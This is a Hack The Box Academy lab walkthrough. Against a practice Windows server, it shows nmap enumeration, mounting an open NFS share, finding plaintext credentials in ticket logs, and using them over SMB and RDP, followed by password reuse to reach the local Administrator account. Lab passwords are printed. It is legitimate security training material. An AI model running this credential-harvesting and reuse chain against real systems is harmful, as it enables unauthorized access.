# Footprinting Lab - Medium  

[Footprinting Lab - Medium](https://academy.hackthebox.com/module/112/section/1079)  

>This server is a server that everyone on the internal network has access to. 
>In discussion with client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.
>Our customer agreed to this and added this server to our scope.
>The goal is to find out as much information as possible about this server and find ways to use it against the server itself.
>Obtain a user named `HTB` credentials as proof.  

## Enumeration  

>NMAP Scans  

```
sudo nmap 10.129.102.65
```  

>NMAP output:  

```
PORT     STATE SERVICE
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
```  

>NMAP discovered ports scan full scripts, OS and service versions enumeration.  

```
sudo nmap -p 111,135,139,445,2049,3389 -sCV -A -O 10.129.102.65
```  

>NMAP Detailed output:  

```
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-07-16T11:54:41+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-16T11:54:32+00:00
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2023-07-15T11:48:12
|_Not valid after:  2024-01-14T11:48:12
```  

### NFS  

>Network File System [NFS](https://academy.hackthebox.com/module/112/section/1068) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network.  

>Check with public readable NFS share volumes.  

```
rpcinfo -p 10.129.102.65

showmount -a 10.129.102.65

showmount -e 10.129.102.65
```  

>Discovered the NFS volume, `/TechSupport`, with comment `everyone`.  
>Mounting NFS Share.  

```
mkdir nfs-folder
sudo mount -t nfs 10.129.102.65:/TechSupport ./nfs-folder/ -o nolock

sudo su

cd nfs-folder
tree .

ls -al
```  

>Discover one of the ticket log files are larger than the others in the mounted `nfs-folder`.

![nfs-Footprinting-Lab-medium](/images/nfs-Footprinting-Lab-medium.png)  

>Unmount the NFS share to kali.

```
sudo umount ./nfs-folder
```  

## Foothold  

>Testing the credentials from the ticket log file for user `alex` with the password `lol123!mD` against the other services.  

### SMB  

>Server Message Block [SMB](https://academy.hackthebox.com/module/112/section/1067) is a client-server protocol that regulates access to files and entire directories.  

>CrackMapExec SMB  

```
crackmapexec smb 10.129.102.65 --shares -u '' -p ''

crackmapexec smb 10.129.102.65 --shares -u 'alex' -p 'lol123!mD' -d 'WINMEDIUM'
```  

>Identified share `devshare` with READ and WRITE permissions for the user `alex`.  

```
smbclient -U alex \\\\10.129.102.65\\devshare
get important.txt
exit
```

>The content of the file `important.txt` contained login credentials for the accounts `sa`.

```
sa:87N1ns@slls83
```  

![smb-Footprinting-Lab-medium](/images/smb-Footprinting-Lab-medium.png)  

### Remote Desktop 

>RDP - Remote Desktop

```
sudo xfreerdp /v:10.129.102.65 /u:alex /p:'lol123!mD' /cert:ignore /d:WINMEDIUM /dynamic-resolution
```  

>Test for password reuse on all users local to the remote target server.
>Using the password `87N1ns@slls83` again with the local `Administrator`, allows to run the Microsoft SQL Server Management Studio application as the local administrator.  

![sql-studio-Footprinting-Lab-medium](/images/sql-studio-Footprinting-Lab-medium.png)  











